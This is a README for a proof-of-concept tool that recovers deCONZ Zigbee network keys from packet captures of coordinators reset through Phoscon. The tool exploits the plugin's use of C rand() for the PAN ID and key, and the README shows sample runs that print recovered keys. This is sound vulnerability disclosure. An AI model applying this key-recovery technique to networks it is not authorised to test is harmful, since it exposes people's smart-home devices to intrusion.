# deCONZ Zigbee network key leak proof-of-concept
This script derives the deCONZ Zigbee network key from a packet capture of any
coordinator that has been reset from the Phoscon web interface.

⚠️ **Raspbee and Conbee devices used out-of-the-box (i.e. never reset) are unaffected
because the factory-programmed network key is securely generated.** ⚠️

## Background
The deCONZ REST plugin uses the [C `rand()` function](https://en.cppreference.com/w/c/numeric/random/rand) to generate both the Zigbee network PAN ID and the network key when an adapter is factory reset.  `rand()` is a simple [Linear congruential generator](https://en.wikipedia.org/wiki/Linear_congruential_generator) on every common platform, which is unsuitable for generating secret keys.

The first output of `rand()` is directly used as the Zigbee network PAN ID.  This leaks most of the random number generator's internal state and allows an attacker to quickly brute force the remaining 2<sup>16</sup> or 2<sup>17</sup> state bits to find the network key.

## Installation
```console
$ virtualenv -p 3 venv
$ source venv/bin/activate
$ pip install -r requirements.txt
```

## Usage
```console
$ python3 find_deconz_network_key.py captures/capture_linux.pcapng
Loading scapy
Reading packets from captures/capture_linux.pcapng
Found deCONZ network 0x3B5C
 13%|█████            ▏                        | 8.37k/65.5k [00:04<00:29, 1.95k keys/s]
Network key for 0x3B5C: 36:33:62:35:65:38:38:66:34:39:36:36:37:65:63:33

$ python3 find_deconz_network_key.py captures/capture_windows.pcapng
Loading scapy
Reading packets from captures/capture_windows.pcapng
Found deCONZ network 0x697F
100%|██████████████████████████████████████████| 65.5k/65.5k [00:57<00:00, 1.14k keys/s]
 41%|████████████████████                      | 54.0k/131k [00:30<00:43, 1.77k keys/s]
Network key for 0x697F: 33:30:65:30:34:31:32:62:35:33:62:31:32:64:64:64
```
